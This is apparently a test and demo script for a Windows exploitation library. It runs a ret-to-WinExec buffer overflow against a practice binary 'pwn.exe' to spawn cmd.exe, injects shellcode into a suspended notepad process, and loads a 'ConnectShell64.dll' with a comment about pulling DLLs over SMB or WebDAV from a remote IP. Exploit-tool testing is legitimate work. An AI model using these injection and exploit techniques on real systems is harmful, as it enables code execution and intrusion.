import sys
import os.path
sys.path.append(os.path.abspath(__file__ + "\..\.."))
from pwintools import *

def test_process():
    # Run pwn.exe
    proc = Process("pwn.exe")
    print(proc)
    
    # Search in memory cmd.exe
    cmd_exe = proc.search_memory("cmd.exe\0")
    if cmd_exe:
        print("0x{:x} : {}".format(cmd_exe, proc.leak(cmd_exe, 7)))
    
    # Get WinExec address
    WinExecImport = proc.get_import('kernel32.dll', 'WinExec')
    print("WinExecImport : 0x{:x}".format(WinExecImport))
    
    WinExec = u32(proc.leak(WinExecImport, 4))
    k32WinExec = proc.get_remote_func_addr('kernel32.dll', 'WinExec')
    print("WinExec imported 0x{:x} : kernel32!WinExec 0x{:x}".format(WinExec, k32WinExec))

    print(proc.recvline())
    print(proc.recvline())

    # You can also Debug it in Python see PythonForWindows documentation
    # proc.spawndebugger(False)
    # Dirty crash incoming for pwn.exe :D
    proc.send('A' * 0x80 + p32(WinExec) + p32(0x42424242) + p32(cmd_exe) + 'A' * 4)
    proc.interactive()
    proc.close()

# TODO Example with 
# CREATE_SUSPENDED AND proc.threads[0].resume()

def test_remote():
    # Connect TCP 127.0.0.1:8888
    r = Remote('127.0.0.1', 8888)
    print(r)
    # Send 'TEST' and waits for 'quit'
    r.sendline('TEST')
    buf = ''
    while buf != 'quit\n':
        buf = r.recvall()
        print(buf)
    r.interactive()

def run_shellcode(sc, debug = False):
    if debug:
        print(disasm(sc))
        print(hexdump(sc))
    import windows.test
    notepad = Process(r"C:\Windows\system32\notepad.exe", CREATE_SUSPENDED)
    if debug:
        notepad.spawndebugger()
    notepad.execute(sc, notepad.virtual_alloc(0x1000))
    raw_input("Press enter to close shellcoded notepad")
    notepad.close()

def test_shellcode1():
    sc = shellcraft.amd64.WinExec("cmd.exe /C start cmd.exe")
    run_shellcode(sc, True)

def test_shellcode2():
    # Works over SMB or WebDAV \\IP\X\X.dll
    #  Or with fullpath D:\Desktop\XYZ\A.dll
    sc = shellcraft.amd64.LoadLibrary(r"ConnectShell64.dll")
    run_shellcode(sc, True)

def test_shellcode3():
    sc = shellcraft.amd64.AllocRWX(0x1234000, 0xcccccccccccccccc)
    run_shellcode(sc, True)

# test_process()